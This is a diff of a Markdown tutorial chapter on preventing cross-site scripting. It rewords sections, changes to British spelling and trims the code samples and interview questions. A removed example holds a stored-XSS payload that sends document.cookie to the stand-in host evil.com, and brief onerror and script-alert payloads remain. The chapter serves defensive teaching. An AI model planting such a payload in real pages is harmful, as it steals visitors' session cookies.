@@ -5,7 +5,7 @@ chapter: 0
 slug: xss-prevention
 level: intermediate # beginner | intermediate | advanced
 reading_time: 10
-updated: 2026-08-28
+updated: 2026-09-09
 tags: [frontend, security, xss, prevention]
 in_book: true
 ---
@@ -32,20 +32,8 @@ The difference is **where the payload comes from**, not what it does.
 | **Stored**       | Saved in your database, served to many users  | A malicious blog comment                 |
 | **DOM-based**    | Never reaches the server — pure client-side   | `innerHTML = location.hash`              |
 
-### 💡 **Stored XSS is the most dangerous**
-
-It runs for **every** visitor automatically. No link to click. One bad comment can hit thousands of users.
-
-```typescript
-// Attacker submits this as a "comment":
-const payload =
-  `<img src=x onerror="fetch('https://evil.com/c?'+document.cookie)">`;
-
-// ❌ Vulnerable: raw value goes straight into HTML
-function renderComment(text: string): string {
-  return `<div class="comment">${text}</div>`; // payload runs for everyone
-}
-```
+Stored is the worst of the three. It runs for **every** visitor with no link to click, so one
+`<img src=x onerror=...>` in a comment field reaches thousands of users.
 
 ## The Core Rule: Context-Aware Output Encoding
 
@@ -59,29 +47,16 @@ The same input is dangerous in different ways depending on **where** you put it.
 | **URL**           | `<a href="/s?q=HERE">`           | `encodeURIComponent`                |
 | **CSS**           | `style="width: HERE"`            | Avoid user input in CSS entirely    |
 
-**HTML-context encoder:**
-
-```typescript
-function encodeHtml(input: string): string {
-  return input
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;")
-    .replace(/"/g, "&quot;")
-    .replace(/'/g, "&#x27;");
-}
-
-// '<script>alert(1)</script>' → '&lt;script&gt;alert(1)&lt;/script&gt;'
-```
-
-> ⚠️ **Don't write your own encoder in production.** Use your framework's built-in escaping (React, Angular, a template engine). The example above is to show the idea, not to ship.
+> ⚠️ **Never write your own encoder.** HTML entity encoding turns `<script>` into
+> `&lt;script&gt;`, and every framework and template engine already does it correctly for the HTML
+> body context. A hand-rolled `replace()` chain will miss a context and be trusted anyway.
 
 ### Special case: data inside inline `<script>` (SSR)
 
-When you serialize state into the page for hydration, an attacker can break out of the string with `</script>`. Escape the unsafe characters in the JSON.
+When you serialise state into the page for hydration, an attacker can break out of the string with `</script>`. Escape the unsafe characters in the JSON.
 
 ```typescript
-// ✅ Safe: neutralize <, >, & before embedding JSON in HTML
+// ✅ Safe: neutralise <, >, & before embedding JSON in HTML
 function safeJson(data: unknown): string {
   return JSON.stringify(data)
     .replace(/</g, "\\u003c")
@@ -131,13 +106,12 @@ const div = document.createElement("div");
 div.textContent = name; // cannot inject markup
 ```
 
-**Key insight:**
+> `innerHTML` parses HTML. `textContent` does not. If you do not need HTML, never reach for
+> `innerHTML`.
 
-> `innerHTML` parses HTML. `textContent` does not. If you don't need HTML, never reach for `innerHTML`.
+## Sanitising Rich HTML with DOMPurify
 
-## Sanitizing Rich HTML with DOMPurify
-
-Sometimes you **must** render HTML you didn't write — a rich-text editor, a CMS body, markdown output. Encoding would break the formatting. You need **sanitization**: parse the HTML and strip anything dangerous.
+Sometimes you **must** render HTML you didn't write — a rich-text editor, a CMS body, markdown output. Encoding would break the formatting. You need **sanitisation**: parse the HTML and strip anything dangerous.
 
 `DOMPurify` is the standard. It removes `<script>`, event handlers like `onerror`, and `javascript:` URLs.
 
@@ -158,7 +132,7 @@ const clean: string = DOMPurify.sanitize(dirty, {
 });
 ```
 
-> ✨ **Sanitize on output, at render time** — not just on input. Sanitizing only on save can be bypassed if data enters your DB another way (imports, other endpoints, old rows).
+> ⚠️ **Sanitise on output, at render time** — not just on input. Sanitising only on save can be bypassed if data enters your DB another way (imports, other endpoints, old rows).
 
 ## How React Protects You (and Where It Doesn't)
 
@@ -177,7 +151,7 @@ function Greeting({ name }: { name: string }) {
 ```typescript
 import DOMPurify from "dompurify";
 
-// 1. dangerouslySetInnerHTML — bypasses escaping. Always sanitize first.
+// 1. dangerouslySetInnerHTML — bypasses escaping. Always sanitise first.
 function Article({ html }: { html: string }) {
   const clean = DOMPurify.sanitize(html);
   return <div dangerouslySetInnerHTML={{ __html: clean }} />;
@@ -192,13 +166,13 @@ function SafeLink({ url, children }: { url: string; children: React.ReactNode })
 
 **React's three blind spots:**
 
-- ❌ `dangerouslySetInnerHTML` without sanitization
+- ❌ `dangerouslySetInnerHTML` without sanitisation
 - ❌ `href` / `src` set to a `javascript:` URL
 - ❌ Spreading unknown props onto an element (`{...userControlled}`)
 
-## Defense in Depth: CSP, Trusted Types, HttpOnly
+## Defence in Depth: CSP, Trusted Types, HttpOnly
 
-Encoding and sanitization are your first line. These add backup layers so a single mistake isn't fatal.
+Encoding and sanitisation are your first line. These add backup layers so a single mistake isn't fatal.
 
 **Content Security Policy** — blocks injected scripts from running at all. See [Chapter ?? — Content Security Policy](#ch-content-security-policy).
 
@@ -210,30 +184,15 @@ res.setHeader(
 // An injected <script>alert(1)</script> is blocked even if it lands in the DOM
 ```
 
-**Trusted Types** — a newer browser feature that makes dangerous sinks like `innerHTML` refuse plain strings. You must pass a value created by an approved policy, which forces sanitization through one chokepoint.
+**Trusted Types** — enforced with `require-trusted-types-for 'script'`, this makes sinks like
+`innerHTML` reject plain strings. Assignment throws unless the value came from a policy you registered
+with `trustedTypes.createPolicy`, which forces every sanitiser call through one chokepoint. Chromium
+only, as of 2026.
 
-```typescript
-// Enforce via header (Chromium-based browsers):
-// Content-Security-Policy: require-trusted-types-for 'script';
+**HttpOnly cookies** — a session cookie set with `httpOnly`, `secure` and `sameSite: "strict"` is
+invisible to `document.cookie`. Injected script still runs, but it cannot read the session token.
 
-const policy = trustedTypes.createPolicy("app-html", {
-  createHTML: (input: string): string => DOMPurify.sanitize(input),
-});
-
-el.innerHTML = policy.createHTML(dirty); // string assignment would now throw
-```
-
-**HttpOnly cookies** — XSS can't read a cookie marked `HttpOnly`, so it can't steal the session even if it runs.
-
-```typescript
-res.cookie("sessionId", token, {
-  httpOnly: true, // not visible to document.cookie
-  secure: true, // HTTPS only
-  sameSite: "strict",
-});
-```
-
-> **Layered thinking:** Encode/sanitize so injection can't happen → CSP so injected code can't run → HttpOnly so a successful script can't grab the session.
+> **Layered thinking:** Encode/sanitise so injection can't happen → CSP so injected code can't run → HttpOnly so a successful script can't grab the session.
 
 ## 🔑 Key Takeaways
 
@@ -245,30 +204,22 @@ res.cookie("sessionId", token, {
 
 ## Interview Questions
 
-**Q1: What are the three types of XSS?**
-
-Reflected (payload in the request, echoed back), Stored (payload saved server-side, served to many users), and DOM-based (payload handled entirely in client JS, never hits the server). Stored is usually the most damaging because it runs for every visitor.
-
-**Q2: Encoding vs. sanitization — when do you use each?**
+**Q: Encoding vs. sanitisation — when do you use each?**
 
 - **Encoding** turns special characters into safe text (`<` → `&lt;`). Use it for plain text you display — names, comments, search terms.
-- **Sanitization** parses HTML and removes dangerous parts. Use it only when you must render real HTML — rich-text or CMS content.
+- **Sanitisation** parses HTML and removes dangerous parts. Use it only when you must render real HTML — rich-text or CMS content.
 
-**Q3: How does React prevent XSS, and where does it fall short?**
+**Q: How does React prevent XSS, and where does it fall short?**
 
-React escapes all JSX text by default. It does **not** protect `dangerouslySetInnerHTML`, `javascript:` URLs in `href`/`src`, or spread props. Sanitize HTML with DOMPurify and validate URLs before using them.
+React escapes all JSX text by default. It does **not** protect `dangerouslySetInnerHTML`, `javascript:` URLs in `href`/`src`, or spread props. Sanitise HTML with DOMPurify and validate URLs before using them.
 
-**Q4: What is DOM-based XSS and why is it harder to catch?**
+**Q: What is DOM-based XSS and why is it harder to catch?**
 
 It happens when client JS reads an attacker-controlled source (URL, `postMessage`, `localStorage`) and writes it to a dangerous sink (`innerHTML`, `eval`). The payload never reaches the server, so server-side scanners and WAFs never see it. Fix it by using `textContent` and avoiding dangerous sinks.
 
-**Q5: Does CSP replace output encoding?**
+**Q: Does CSP replace output encoding?**
 
 No. CSP is a **second** layer. Encoding stops injection; CSP stops injected code from running if encoding is missed somewhere. Use both — defense in depth.
-
-**Q6: How does the HttpOnly flag help against XSS?**
-
-It hides the cookie from JavaScript. XSS can still run code, but `document.cookie` won't return the session token, so the attacker can't exfiltrate it. It limits the blast radius — it doesn't prevent the XSS itself.
 
 ## What to Read Next
 
